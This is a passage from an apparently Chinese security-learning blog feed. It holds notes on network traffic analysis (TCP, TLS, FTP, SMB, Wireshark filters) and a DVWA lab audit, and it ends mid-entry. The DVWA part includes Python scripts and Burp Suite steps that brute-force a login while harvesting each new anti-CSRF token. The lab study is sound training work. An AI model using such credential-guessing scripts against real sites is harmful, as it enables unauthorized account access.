alt="image-20231128202614334"></p><p>当检查这个输出时，我们可以在第一行看到握手的开始。查看红框中突出显示的信息，我们可以看到我们的初始Syn标志已设置。如果我们看一下绿色下划线的端口号，我们可以看到两个数字，57678和80。第一个数字是客户端使用的随机高端口号，第二个是服务器用来侦听传入web请求连接的HTTP的众所周知的端口。在第2行中，我们可以看到服务器对客户端的响应，其中SYN&#x2F;ACK数据包发送到相同的端口。在第3行，我们可以看到客户端确认服务器的同步数据包以建立连接。</p><p><a href="https://blog.csdn.net/jingzhi111/article/details/90668616">计算机网络—02：TCP的三报文握手和四报文握手-CSDN博客</a></p><blockquote><p>最开始，A、B：CLOSED（关闭）状态，A、B都创建传输控制块TCB。<br>第一个：A向B发送 连接请求报文段（同步位SYN&#x3D;1，不能携带数据，初始序号 seq&#x3D;x）；<br>A发送后：SYN-SENT（同步已发送）状态；B：LISTEN（收听）状态。<br>第二个：B向A发送 确认报文段（SYN&#x3D;1，ACK&#x3D;1，确认号ack&#x3D;x+1，不能携带数据，初始序号 seq&#x3D;y）；<br>B收到并发送后：SYN-RCVD（同步收到）状态。<br>第三个：A向B发送 确认报文段（ACK&#x3D;1，ack&#x3D;y+1，序号seq&#x3D;x+1，携带数据消耗序号，不携带不消耗）；<br>A收到并发送后：ESTAB-LISHED（已建立连接）状态。<br>B收到后：ESTAB-LISHED（已建立连接）状态。</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20190603235435593.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2ppbmd6aGkxMTE=,size_16,color_FFFFFF,t_70" alt="img"></p><blockquote><p>为什么A最后还要发送一次确认？</p><p>主要是为了防止<strong>已失效的连接请求报文段</strong>（A向B发送的第一个报文段延误到连接释放以后的某个时间）突然又传送到了B，让B误以为A又发出了一次新的连接请求，因而产生错误。</p></blockquote><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><h4 id="HTTP-Methods"><a href="#HTTP-Methods" class="headerlink" title="HTTP Methods"></a>HTTP Methods</h4><p>**HEAD:**required是一种安全的方法，它从服务器请求响应，类似于Get请求，只是不包括消息正文。这是获取有关服务器及其操作状态的更多信息的好方法。</p><p><strong>OPTIONS：</strong>可选OPTIONS方法可以收集服务器识别的支持HTTP方法的信息。通过这种方式，我们可以确定与特定资源或服务器交互的需求，而无需实际向其请求数据或对象。</p><h2 id="HTTPS"><a href="#HTTPS" class="headerlink" title="HTTPS"></a>HTTPS</h2><p>HTTPS HTTP安全（HTTPS）是对HTTP协议的一种修改，旨在利用传输层安全（TLS）或安全套接字层（SSL）与旧应用程序进行数据安全。TLS被用作加密机制，以确保客户端和服务器之间的通信安全。TLS可以将常规HTTP流量封装在TLS中，这意味着我们可以加密整个会话，而不仅仅是发送或请求的数据。在TLS机制建立之前，我们很容易受到中间人攻击和其他类型的侦察或劫持，这意味着与客户端或服务器在同一局域网中的任何人都可以查看网络流量，如果他们正在窃听。我们现在可以在浏览器中实现安全性，使每个人都能加密自己的网络习惯、搜索请求、会话或数据传输、银行交易等等。 尽管HTTPS的基础是HTTP，但HTTPS使用端口443和8443而不是标准端口80。这是客户端向服务器发出希望建立安全连接的信号的一种简单方式。让我们看一看HTTPS流量的输出，并在一分钟内了解TLS握手是如何工作的。</p><h4 id="TLS-Handshake-Via-HTTPS"><a href="#TLS-Handshake-Via-HTTPS" class="headerlink" title="TLS Handshake Via HTTPS"></a>TLS Handshake Via HTTPS</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939347.png" alt="image-20231128204101092"></p><p>在前几个数据包中，我们可以看到客户端使用蓝色框中的端口443建立了与服务器的会话。这向服务器发出信号，表示它希望使用HTTPS作为应用程序通信协议。 一旦通过TCP启动会话，接下来将发送TLS ClientHello以开始TLS握手。在握手过程中，会商定几个参数，包括会话标识符、对等x509证书、要使用的压缩算法、密码规范加密算法（如果会话可恢复）以及客户端和服务器之间共享的48字节主密钥，以验证会话。 一旦会话建立，所有数据和方法都将通过TLS连接发送，并显示为TLS应用程序数据，如红框中所示。TLS仍在使用TCP作为其传输协议，因此我们仍将看到来自端口443的流的确认数据包。 总结握手：</p><p>总结握手： </p><ul><li>客户端和服务器交换问候消息以就连接参数达成一致。</li><li>客户端和服务器交换必要的加密参数以建立预主密钥。</li><li>客户端和服务器将交换x.509证书和加密信息，以便在会话中进行身份验证。 从预主密钥生成主密钥并交换随机值。</li><li>客户端和服务器向TLS协议的记录层部分发布协商的安全参数。</li><li>客户端和服务器验证其对等方是否计算了相同的安全参数，以及握手是否在未被攻击者篡改的情况下进行。</li></ul><p> 加密本身是一个复杂而冗长的主题，值得拥有自己的模块。本节简单总结了HTTP和TLS如何在HTTPS应用程序协议中提供安全性。有关HTTPS如何工作以及TLS如何执行安全操作的更多信息，请参阅RFC:2246。</p><h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p>FTP通过TCP使用端口20和21。端口20用于数据传输，而端口21用于发出控制FTP会话的命令。关于身份验证，FTP支持用户身份验证，并允许匿名访问（如果配置）。 FTP可以在两种不同的模式下运行，主动模式或被动模式。Active是FTP使用的默认操作方法，这意味着服务器侦听来自客户端的控制命令PORT，说明要使用哪个端口进行数据传输。被动模式使我们能够访问位于防火墙后面的FTP服务器或启用NAT的链接，这使得直接TCP连接变得不可能。在这种情况下，客户端将发送PASV命令，并等待来自服务器的响应，通知客户端要使用什么IP和端口进行数据传输通道连接。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939348.png" alt="image-20231128204551224"></p><p>上图显示了通过FTP命令通道发出的请求的几个示例绿色箭头，以及从FTP服务器发回的响应蓝色箭头。这都是很标准的东西。有关每个命令及其执行的操作的列表，请查看下表。 当查看FTP流量时，我们可以看到通过端口21传递的一些常见命令包括：</p><table><thead><tr><th><code>USER</code></th><th>specifies the user to log in as.</th></tr></thead><tbody><tr><td><code>PASS</code></td><td>sends the password for the user attempting to log in.</td></tr><tr><td><code>PORT</code></td><td>when in active mode, this will change the data port used.</td></tr><tr><td><code>PASV</code></td><td>switches the connection to the server from active mode to passive.</td></tr><tr><td><code>LIST</code></td><td>displays a list of the files in the current directory.</td></tr><tr><td><code>CWD</code></td><td>will change the current working directory to one specified.</td></tr><tr><td><code>PWD</code></td><td>prints out the directory you are currently working in.</td></tr><tr><td><code>SIZE</code></td><td>will return the size of a file specified.</td></tr><tr><td><code>RETR</code></td><td>retrieves the file from the FTP server.</td></tr><tr><td><code>QUIT</code></td><td>ends the session.</td></tr></tbody></table><h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>像任何其他使用TCP作为传输机制的应用程序一样，它将执行标准功能，如三方握手和确认接收到的数据包。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939349.png" alt="image-20231128204834352"></p><p>查看上图，我们可以看到它在每次建立会话橙色框时都会执行TCP握手。当查看源和目标端口蓝框时，端口445正在被利用，通过TCP发送SMB流量信号。如果我们看一下绿框，信息字段告诉我们SMB通信中发生了什么。在这个例子中，有很多错误，这是一个需要深入研究的例子。来自用户的一到两次身份验证失败相对常见，但重复的大量身份验证失败可能表明潜在的未经授权的个人试图访问用户的帐户或使用其凭据进行移动。这是攻击者的一种常见策略，他们会抓住经过身份验证的用户，窃取他们的凭据，利用它们进行横向移动，或者访问他们通常会被拒绝访问的资源。 这只是SMB使用的一个示例。我们将看到的另一个常见问题是服务器和主机之间的文件共享访问。在大多数情况下，这是定期沟通。但是，如果我们看到主机访问其他主机上的文件共享，这并不常见。请注意谁在请求连接、在哪里以及他们在做什么。</p><h1 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h1><p>现在考虑一下。如果没有我们日常网络流量的基线，我们怎么知道该网络的典型情况？在捕获时间范围内，我们获取了大量信息，我们需要清除其中的一些信息。此过程可能需要花费大量时间，因为我们必须检查每个对话以确保它正常，确定我们看到的主机是否属于网络或流氓资产等等。这个过程很快成为一项艰巨的任务，对吧？</p><p>通过此方案和对网络基线的访问，我们可以快速剥离已知良好的通信。利用数据分析工具（例如 Wireshark 中的顶级通信者模块）可以帮助识别可能正在发送大量数据的主机。我们可以根据主机的正常基线进行检查，以确定它是否不正常。另一种方法是查看内部主机或公共和不通用端口之间的连接。由于我们可以清除视图，我们现在可以看到多个用户主机在端口 8080 和 445 上连接。端口本身并不奇怪，但事实是两台用户 PC 通过这些端口相互通信。Web 流量通常从主机流向托管的 Web 服务器或托管业务应用程序的 Intranet Web 服务器。SMB 流量也是如此。看到两个主机通过此端口相互通信是非常可疑的。根据我们现在所知道的情况，我们可以快速发送故障单，寻求帮助，立即处理潜在的违规行为。</p><h1 id="TCPDUMP"><a href="#TCPDUMP" class="headerlink" title="TCPDUMP"></a>TCPDUMP</h1><p>这里为了备考这个板块姑且先跳过</p><h1 id="WireShark"><a href="#WireShark" class="headerlink" title="WireShark"></a>WireShark</h1><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939350.png" alt="image-20231129093140964"></p><p>数据包列表：橙色</p><blockquote><p>在这个窗口中，我们看到每个数据包的摘要行，默认情况下包括下面列出的字段。我们可以添加或删除列来更改显示的信息。 </p><ul><li>Number-到达Wireshark的数据包 时间-Unix时间格式 Source-源IP Destination-目标IP </li><li>Protocol-使用的协议（TCP、UDP、DNS、ECT。） </li><li>Information—有关数据包的信息。此字段可能会根据内部使用的协议类型而有所不同。例如，它将显示DNS数据包的查询类型。</li></ul></blockquote><p>数据包详细信息：蓝色 </p><blockquote><p>数据包详细信息窗口允许我们深入数据包，以更详细地检查协议。它将把它分解成我们所期望的块，遵循典型的OSI模型参考。将包分割成不同的封装层以进行检查。 请记住，Wireshark将以相反的顺序显示这种封装，在窗口顶部显示较低层的封装，在底部显示较高级别的封装。</p></blockquote><p>数据包字节数：绿色 </p><blockquote><p>“数据包字节”窗口允许我们查看ASCII或十六进制输出中的数据包内容。当我们从上面的窗口中选择一个字段时，它将在“数据包字节”窗口中突出显示，并向我们显示该位或字节在整个数据包中的位置。 这是验证我们在Details窗格中看到的内容是否准确以及Wireshark所做的解释是否与数据包输出匹配的好方法。 输出中的每一行都包含数据偏移量、十六个十六进制字节和十六个ASCII字节。不可打印的字节将替换为ASCII格式的句点。</p></blockquote><h3 id="fileter"><a href="#fileter" class="headerlink" title="fileter"></a>fileter</h3><table><thead><tr><th><strong>Capture Filters</strong></th><th><strong>Result</strong></th></tr></thead><tbody><tr><td>host x.x.x.x</td><td>Capture only traffic pertaining to a certain host</td></tr><tr><td>net x.x.x.x&#x2F;24</td><td>Capture traffic to or from a specific network (using slash notation to specify the mask)</td></tr><tr><td>src&#x2F;dst net x.x.x.x&#x2F;24</td><td>Using src or dst net will only capture traffic sourcing from the specified network or destined to the target network</td></tr><tr><td>port #</td><td>will filter out all traffic except the port you specify</td></tr><tr><td>not port #</td><td>will capture everything except the port specified</td></tr><tr><td>port # and #</td><td>AND will concatenate your specified ports</td></tr><tr><td>portrange x-x</td><td>portrange will grab traffic from all ports within the range only</td></tr><tr><td>ip &#x2F; ether &#x2F; tcp</td><td>These filters will only grab traffic from specified protocol headers.</td></tr><tr><td>broadcast &#x2F; multicast &#x2F; unicast</td><td>Grabs a specific type of traffic. one to one, one to many, or one to all.</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939351.png" alt="image-20231129095646892"></p><table><thead><tr><th><strong>Display Filters</strong></th><th><strong>Result</strong></th></tr></thead><tbody><tr><td>ip.addr &#x3D;&#x3D; x.x.x.x</td><td>Capture only traffic pertaining to a certain host. This is an OR statement.</td></tr><tr><td>ip.addr &#x3D;&#x3D; x.x.x.x&#x2F;24</td><td>Capture traffic pertaining to a specific network. This is an OR statement.</td></tr><tr><td>ip.src&#x2F;dst &#x3D;&#x3D; x.x.x.x</td><td>Capture traffic to or from a specific host</td></tr><tr><td>dns &#x2F; tcp &#x2F; ftp &#x2F; arp &#x2F; ip</td><td>filter traffic by a specific protocol. There are many more options.</td></tr><tr><td>tcp.port &#x3D;&#x3D; x</td><td>filter by a specific tcp port.</td></tr><tr><td>tcp.port &#x2F; udp.port !&#x3D; x</td><td>will capture everything except the port specified</td></tr><tr><td>and &#x2F; or &#x2F; not</td><td>AND will concatenate, OR will find either of two options, NOT will exclude your input option.</td></tr></tbody></table><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202407110939352.png" alt="image-20231129095938604"></p><blockquote><p>在使用捕获和显示过滤器时，请记住，我们指定的内容是从字面意义上获取的。例如，对端口80流量的过滤与对HTTP的过滤不同。将端口和协议想象成更像是指导方针，而不是严格的规则。端口可以绑定并用于不同的目的，而不是最初的目的。例如，HTTP过滤将查找协议使用的关键标记，如GET&#x2F;POST请求，并显示它们的结果。对端口80的过滤将显示通过该端口发送或接收的任何内容，而与传输协议无关。 在下一节中，我们将介绍Wireshark的一些更高级的功能。</p></blockquote><h2 id="从GUI提取文件"><a href="#从GUI提取文件" class="headerlink" title="从GUI提取文件"></a>从GUI提取文件</h2><h2 id="练习"><a href="#练习" class="headerlink" title="练习"></a>练习</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://academy.hackthebox.com/module/81/section/963&quot;&gt;Intro to Network Traffic Analysis (hackthebox.com)&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;基础介绍&quot;&gt;&lt;</summary>
      
    
    
    
    
    <category term="MISC" scheme="https://taninluv.github.io/tags/MISC/"/>
    
    <category term="NTA" scheme="https://taninluv.github.io/tags/NTA/"/>
    
    <category term="HTB" scheme="https://taninluv.github.io/tags/HTB/"/>
    
  </entry>
  
  <entry>
    <title>DVWA</title>
    <link href="https://taninluv.github.io/2023/11/28/DVWA/"/>
    <id>https://taninluv.github.io/2023/11/28/DVWA/</id>
    <published>2023-11-28T01:41:29.000Z</published>
    <updated>2023-11-29T03:26:17.859Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>都只尝试审计一下高难度，顺带练习一下代码审计工具,这里impassible难度是已经防御好的，high是高难度，我们主要关注这两个部分的源码</p><h1 id="Brute-Force"><a href="#Brute-Force" class="headerlink" title="Brute Force"></a>Brute Force</h1><p>暴力破解，感觉没什么好审的，还是看看源码：</p><blockquote><?phpif( isset( $_POST[ 'Login' ] ) ) {  // Check Anti-CSRF token  checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );  // Sanitise username input  $user = $_POST[ 'username' ];  $user = stripslashes( $user );  $user = mysql_real_escape_string( $user );  // Sanitise password input  $pass = $_POST[ 'password' ];  $pass = stripslashes( $pass );  $pass = mysql_real_escape_string( $pass );  $pass = md5( $pass );  // Default values  $total_failed_login = 3;  $lockout_time    = 15;  $account_locked   = false;  // Check the database (Check user information)  $data = $db->prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR );  $data->execute();  $row = $data->fetch();  // Check to see if the user has been locked out.  if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {​    // User locked out.  Note, using this method would allow for user enumeration!​    //echo "<pre><br />This account has been locked due to too many incorrect logins.</pre>";​    // Calculate when the user would be allowed to login again​    $last_login = $row[ 'last_login' ];​    $last_login = strtotime( $last_login );​    $timeout   = strtotime( "{$last_login} +{$lockout_time} minutes" );​    $timenow   = strtotime( "now" );​    // Check to see if enough time has passed, if it hasn't locked the account​    if( $timenow > $timeout )​      $account_locked = true;  }  // Check the database (if username matches the password)  $data = $db->prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR);  $data->bindParam( ':password', $pass, PDO::PARAM_STR );  $data->execute();  $row = $data->fetch();  // If its a valid login...  if( ( $data->rowCount() == 1 ) && ( $account_locked == false ) ) {​    // Get users details​    $avatar    = $row[ 'avatar' ];​    $failed_login = $row[ 'failed_login' ];​    $last_login  = $row[ 'last_login' ];​    // Login successful​    echo "<p>Welcome to the password protected area <em>{$user}</em></p>";​    echo "<img src=\"{$avatar}\" />";​    // Had the account been locked out since last login?​    if( $failed_login >= $total_failed_login ) {​      echo "<p><em>Warning</em>: Someone might of been brute forcing your account.</p>";​      echo "<p>Number of login attempts: <em>{$failed_login}</em>.<br />Last login attempt was at: <em>${last_login}</em>.</p>";​    }​    // Reset bad login count​    $data = $db->prepare( 'UPDATE users SET failed_login = "0" WHERE user = (:user) LIMIT 1;' );​    $data->bindParam( ':user', $user, PDO::PARAM_STR );​    $data->execute();  }  else {​    // Login failed​    sleep( rand( 2, 4 ) );​    // Give the user some feedback​    echo "<pre><br />Username and/or password incorrect.<br /><br/>Alternative, the account has been locked because of too many failed logins.<br />If this is the case, <em>please try again in {$lockout_time} minutes</em>.</pre>";​    // Update bad login count​    $data = $db->prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' );​    $data->bindParam( ':user', $user, PDO::PARAM_STR );​    $data->execute();  }  // Set the last login time  $data = $db->prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' );  $data->bindParam( ':user', $user, PDO::PARAM_STR );  $data->execute();}// Generate Anti-CSRF tokengenerateSessionToken();?></blockquote><h2 id="mysql-real-escape-string"><a href="#mysql-real-escape-string" class="headerlink" title="mysql_real_escape_string"></a>mysql_real_escape_string</h2><p><a href="https://www.w3school.com.cn/php/func_mysql_real_escape_string.asp">PHP mysql_real_escape_string() 函数 (w3school.com.cn)</a></p><blockquote><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p><p>下列字符受影响：</p><ul><li>\x00</li><li>\n</li><li>\r</li><li>\</li><li>‘</li><li>“</li><li>\x1a</li></ul><p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p></blockquote><h2 id="stripslashes"><a href="#stripslashes" class="headerlink" title="stripslashes"></a>stripslashes</h2><p><a href="https://www.w3school.com.cn/php/func_string_stripslashes.asp">PHP stripslashes() 函数 (w3school.com.cn)</a></p><p>删除反斜杠</p><h2 id="PDO"><a href="#PDO" class="headerlink" title="PDO"></a>PDO</h2><p><a href="https://www.runoob.com/php/php-pdo.html">PHP PDO | 菜鸟教程 (runoob.com)</a></p><p>PHP 数据对象 （PDO） 扩展为PHP访问数据库定义了一个轻量级的一致接口。</p><p>PDO 提供了一个数据访问抽象层，这意味着，不管使用哪种数据库，都可以用相同的函数（方法）来查询和获取数据</p><h2 id="fetch"><a href="#fetch" class="headerlink" title="fetch()"></a>fetch()</h2><p><a href="https://blog.csdn.net/weixin_43742708/article/details/106027375">PHP预处理语句- fetch方法、fetchAll方法、fetchColumn方法、fetch_style属性_fetch php-CSDN博客</a></p><h2 id="占位符"><a href="#占位符" class="headerlink" title="占位符"></a>占位符</h2><blockquote><p>在这个例子中，<code>(:user)</code> 将被数据库的预处理机制所识别。它表示一个占位符，表示在执行该预处理语句时，会将真正的值绑定到该占位符位置。</p><p>预处理语句中的占位符通常使用问号 <code>?</code> 或命名占位符，例如 <code>:user</code>。这些占位符允许程序在执行 SQL 语句之前，将实际的值绑定到占位符位置，避免了直接在 SQL 查询中嵌入变量值，从而提高了安全性和效率。</p><p>在这个例子中，<code>(:user)</code> 可能代表一个命名占位符，表示在执行预处理语句时，将会把真正的用户名绑定到这个占位符位置。在实际执行查询之前，程序会通过绑定操作将实际的值填充到占位符中。</p></blockquote><h2 id="简单审计"><a href="#简单审计" class="headerlink" title="简单审计"></a>简单审计</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126585.png" alt="image-20231128142725575"></p><p>这里先对token进行检测，防止csrf攻击，这里我们抓一个包看看：</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126586.png" alt="image-20231128143308585"></p><p>他应该是把session和user token有一个绑定以防止csrf</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126587.png" alt="image-20231128144047550"></p><p>这里添加了PDO防护，sql注入应该用不了</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126588.png" alt="image-20231128144446252"></p><p>这里如果登录失败三次会被锁住15分钟</p><p>其他的话就是登陆成功和不成功，sql加了pdo，注不了，只能慢慢爆破</p><h3 id="high"><a href="#high" class="headerlink" title="high:"></a>high:</h3><p>这里爆破的话：</p><p><a href="https://blog.csdn.net/weixin_39934520/article/details/108755709">DVWA通过教程之暴力破解Brute Force_op&#x3D;login&amp;username&#x3D;admin%7cpwd&amp;password&#x3D; 攻击-CSDN博客</a></p><p>可以跟着做一遍，对bp的爆破模式使用加深一下</p><blockquote><p><strong>由于使用了Anti-CSRF token，每次服务器返回的登陆页面中都会包含一个随机的user_token的值，用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。所以，不建议利用burpsuite进行无脑式的爆破了。</strong></p></blockquote><p><em><strong>*Python2.x代码*</strong></em></p><pre><code class="python">from bs4 import BeautifulSoupimport urllib2header=&#123;&#39;Host&#39;:&#39;127.0.0.1&#39;,        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#39;,        &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,        &#39;Referer&#39;:&#39;http://127.0.0.1/vulnerabilities/brute/&#39;,        &#39;cookie&#39;:&#39;PHPSESSID=6oqhn9tsrs80rbf3h4cvjutnn6; security=high&#39;,        &#39;Connection&#39;:&#39;close&#39;,        &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;        &#125;requrl=&quot;http://127.0.0.1/vulnerabilities/brute/&quot; def get_token(requrl,header):    req=urllib2.Request(url=requrl,headers=header)    response=urllib2.urlopen(req)    print response.getcode(),    the_page=response.read()    print len(the_page)    soup=BeautifulSoup(the_page,&quot;html.parser&quot;)   #将返回的html页面解析为一个BeautifulSoup对象    input=soup.form.select(&quot;input[type=&#39;hidden&#39;]&quot;)   #返回的是一个list列表    user_token=input[0][&#39;value&#39;]               #获取用户的token    return user_token user_token=get_token(requrl,header)i=0for line in open(&quot;E:\Password\mima.txt&quot;):    requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token    i=i+1    print i , &#39;admin&#39; ,line.strip(),    user_token=get_token(requrl,header)    if(i==20):        break</code></pre><p><em><strong>*python3.x代码*</strong></em> </p><pre><code class="python">from bs4 import BeautifulSoupimport requests header=&#123;&#39;Host&#39;:&#39;127.0.0.1&#39;,        &#39;User-Agent&#39;:&#39;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#39;,        &#39;Accept&#39;:&#39;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&#39;,        &#39;Accept-Language&#39;:&#39;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&#39;,        &#39;Referer&#39;:&#39;http://127.0.0.1/vulnerabilities/brute/&#39;,        &#39;cookie&#39;:&#39;PHPSESSID=8p4kb7jc1df431lo6qe249quv2; security=high&#39;,        &#39;Connection&#39;:&#39;close&#39;,        &#39;Upgrade-Insecure-Requests&#39;:&#39;1&#39;        &#125;requrl=&quot;http://127.0.0.1/vulnerabilities/brute/&quot; def get_token(requrl,header):    response=requests.get(url=requrl,headers=header)    print (response.status_code,len(response.content))    soup=BeautifulSoup(response.text,&quot;html.parser&quot;)    input=soup.form.select(&quot;input[type=&#39;hidden&#39;]&quot;)   #返回的是一个list列表    user_token=input[0][&#39;value&#39;]                   #获取用户的token    return user_token user_token=get_token(requrl,header)i=0for line in open(&quot;E:\Password\mima.txt&quot;):    requrl=&quot;http://127.0.0.1/vulnerabilities/brute/?username=admin&amp;password=&quot;+line.strip()+&quot;&amp;Login=Login&amp;user_token=&quot;+user_token    i=i+1    print (i , &#39;admin&#39; ,line.strip(),end=&quot;  &quot;)    user_token=get_token(requrl,header)    if(i==20):        break</code></pre><p>bp:</p><p><strong>设置两个参数 password和user_token为变量，攻击类型选择pitchfork，意思是草叉模式（Pitchfork ）——它可以使用多组Payload集合，在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload，举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。</strong></p><p><strong>设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always</strong></p><p> <strong>写上value&#x3D;’ 点击刷新相应信息  服务器返回的token选中（即value后面，表示每次从响应中获取该值）</strong></p><p><strong>将这个token 值先记录下来</strong></p><p><strong>a5f168e741600adb87c761ac45d016dd</strong></p><p><strong>然后设置payload，设置第一个参数载入字典，第二个参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。</strong></p><h4 id="坑："><a href="#坑：" class="headerlink" title="坑："></a>坑：</h4><blockquote><p>在设置好Grep-Extract后，需要重新抓一个包把最新的user token作为初始参数 ，不然Recursive_Grep的参数会抓不到</p></blockquote><h1 id="Command-Inject"><a href="#Command-Inject" class="headerlink" title="Command Inject"></a>Command Inject</h1><pre><code>&lt;?phpif( isset( $_POST[ &#39;Submit&#39; ]  ) ) &#123;    // Check Anti-CSRF token    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );    // Get input    $target = $_REQUEST[ &#39;ip&#39; ];    $target = stripslashes( $target );    // Split the IP into 4 octects    $octet = explode( &quot;.&quot;, $target );    // Check IF each octet is an integer    if( ( is_numeric( $octet[0] ) ) &amp;&amp; ( is_numeric( $octet[1] ) ) &amp;&amp; ( is_numeric( $octet[2] ) ) &amp;&amp; ( is_numeric( $octet[3] ) ) &amp;&amp; ( sizeof( $octet ) == 4 ) ) &#123;        // If all 4 octets are int&#39;s put the IP back together.        $target = $octet[0] . &#39;.&#39; . $octet[1] . &#39;.&#39; . $octet[2] . &#39;.&#39; . $octet[3];        // Determine OS and execute the ping command.        if( stristr( php_uname( &#39;s&#39; ), &#39;Windows NT&#39; ) ) &#123;            // Windows            $cmd = shell_exec( &#39;ping  &#39; . $target );        &#125;        else &#123;            // *nix            $cmd = shell_exec( &#39;ping  -c 4 &#39; . $target );        &#125;        // Feedback for the end user        echo &quot;&lt;pre&gt;&#123;$cmd&#125;&lt;/pre&gt;&quot;;    &#125;    else &#123;        // Ops. Let the user name theres a mistake        echo &#39;&lt;pre&gt;ERROR: You have entered an invalid IP.&lt;/pre&gt;&#39;;    &#125;&#125;// Generate Anti-CSRF tokengenerateSessionToken();?&gt; </code></pre><h2 id="explode"><a href="#explode" class="headerlink" title="explode()"></a>explode()</h2><p><a href="https://www.w3school.com.cn/php/func_string_explode.asp">PHP explode() 函数 (w3school.com.cn)</a></p><p>把字符串打散为数组：</p><pre><code>&lt;?php$str = &quot;Hello world. I love Shanghai!&quot;;print_r (explode(&quot; &quot;,$str));?&gt;</code></pre><h2 id="PHP-stristr-函数"><a href="#PHP-stristr-函数" class="headerlink" title="PHP stristr() 函数"></a>PHP stristr() 函数</h2><p>stristr() 函数搜索字符串在另一字符串中的第一次出现。</p><p><strong>注释：</strong>该函数是二进制安全的。</p><p><strong>注释：</strong>该函数是不区分大小写的。如需进行区分大小写的搜索，请使用 <a href="https://www.w3school.com.cn/php/func_string_strstr.asp">strstr()</a> 函数。</p><p><a href="https://www.w3school.com.cn/php/func_string_stristr.asp">PHP stristr() 函数 (w3school.com.cn)</a></p><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><pre><code>stristr(string,search,before_search)</code></pre><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定被搜索的字符串。</td></tr><tr><td align="left"><em>search</em></td><td align="left">必需。规定要搜索的字符串。如果该参数是数字，则搜索匹配该数字对应的 ASCII 值的字符。</td></tr><tr><td align="left"><em>before_search</em></td><td align="left">可选。默认值为 “false” 的布尔值。如果设置为 “true”，它将返回 <em>search</em> 参数第一次出现之前的字符串部分。</td></tr></tbody></table><h2 id="php-uname"><a href="#php-uname" class="headerlink" title="php_uname"></a>php_uname</h2><p><a href="https://www.php.net/manual/zh/function.php-uname.php">PHP: php_uname - Manual</a></p><p>php_uname(string <code>$mode</code> &#x3D; “a”): string</p><pre><code>mode</code></pre><p><code>mode</code> 是单个字符，用于定义要返回什么信息：</p><ul><li><code>&#39;a&#39;</code>：此为默认。包含序列 <code>&quot;s n r v m&quot;</code> 里的所有模式。</li><li><code>&#39;s&#39;</code>：操作系统名称。例如： <code>FreeBSD</code>。</li><li><code>&#39;n&#39;</code>：主机名。例如： <code>localhost.example.com</code>。</li><li><code>&#39;r&#39;</code>：版本名称，例如： <code>5.1.2-RELEASE</code>。</li><li><code>&#39;v&#39;</code>：版本信息。操作系统之间有很大的不同。</li><li><code>&#39;m&#39;</code>：机器类型。例如：<code>i386</code>。</li></ul><h2 id="简单审计-1"><a href="#简单审计-1" class="headerlink" title="简单审计"></a>简单审计</h2><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202311291126589.png" 